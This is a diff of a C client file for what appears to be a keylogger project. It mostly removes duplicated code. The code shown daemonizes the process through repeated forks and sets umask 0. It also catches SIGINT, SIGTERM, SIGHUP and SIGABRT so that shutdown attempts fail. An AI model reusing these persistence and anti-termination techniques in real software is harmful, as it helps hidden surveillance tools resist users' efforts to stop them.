@@ -2,7 +2,6 @@
  * Client side of server.
  */
 #include "client.h"
-
 #include "keylogger.h"
 #include <errno.h>
 #include <signal.h>
@@ -11,8 +10,6 @@
 #include <unistd.h>
 #include <sys/stat.h>
 
-
-void fileificate() {}
 
 int signal_counter = 0;
 
@@ -41,7 +38,7 @@ void background_process(void) {
     exit(errno);
   }
   else if (process_id > 0){
-    // successfully exit parent process
+    //successfully exit parent process
 
     printf("parent exiting\n");
     exit(0);
@@ -50,10 +47,10 @@ void background_process(void) {
   //printf("backgrounding complete 3\n");
 
   /*
-  // create a new process group
+  //create a new process group
   int group_id = setsid();
 
-  if (group_id == -1){
+  if(group_id == -1){
     perror("Failed to create a process group\n");
     exit(errno);
   }*/
@@ -61,7 +58,7 @@ void background_process(void) {
   //printf("backgrounding complete 4\n");
 
 
-  // redirect signals
+    //redirect signals
   immortalize();
 
   //fork again?
@@ -83,67 +80,6 @@ void background_process(void) {
   }
   //printf("backgrounding complete 6\n");
   //change working directory to root
-
-  chdir(getenv("HOME"));
-
-  //set umask to 0
-
-  umask(0);
-  //signal handle again just to make sure
-  immortalize();
-  printf("backgrounding complete\n");
-
-  // redirect signals
-  // redirect signals
-  immortalize();
-
-  //fork again?
-
-  //printf("backgrounding complete 5\n");
-  process_id = fork();
-
-    if (process_id == -1){
-    perror("Failed to fork Process\n");
-    //status 1 is an error
-    exit(errno);
-  }
-  else if (process_id > 0){
-    //successfully exit parent process
-    printf("killing parent");
-    //raise(SIGKILL);
-    exit(0);
-    perror("this should not be viewable");
-  }
-  //printf("backgrounding complete 6\n");
-  //change working directory to root
-
-  chdir(getenv("HOME"));
-
-  //set umask to 0
-
-  umask(0);
-  //signal handle again just to make sure
-  immortalize();
-  printf("backgrounding complete\n");
-
-  // redirect signals
-  immortalize();
-
-  //fork again?
-
-  process_id = fork();
-
-    if (process_id == -1){
-    perror("Failed to fork Process");
-    //status 1 is an error
-    exit(errno);
-  }
-  else if (process_id > 0){
-    //successfully exit parent process
-    raise(SIGKILL);
-  }
-
-  // change working directory to root
 
   chdir(getenv("HOME"));
 
@@ -152,19 +88,11 @@ void background_process(void) {
   umask(0);
   //signal handle again just to make sure
   immortalize();
+  printf("backgrounding complete\n");
 }
 
-void immortalize(void) {
-    //Redirect common abort/termination/interrupt signals to ignores
+void immortalize(void){
 
-    //int* signal_counter  = malloc(sizeof(int));
-    signal(SIGINT,shutdown_signal);
-    signal(SIGTERM,shutdown_signal);
-    signal(SIGHUP,shutdown_signal);
-    signal(SIGABRT,shutdown_signal);
-}
-
-void immortalize(void) {
     //Redirect common abort/termination/interrupt signals to ignores
 
     //int* signal_counter  = malloc(sizeof(int));
@@ -187,3 +115,4 @@ void shutdown_signal(int signal){
   signal_counter++;
   printf("You tried to shut down but failed");
 }
+
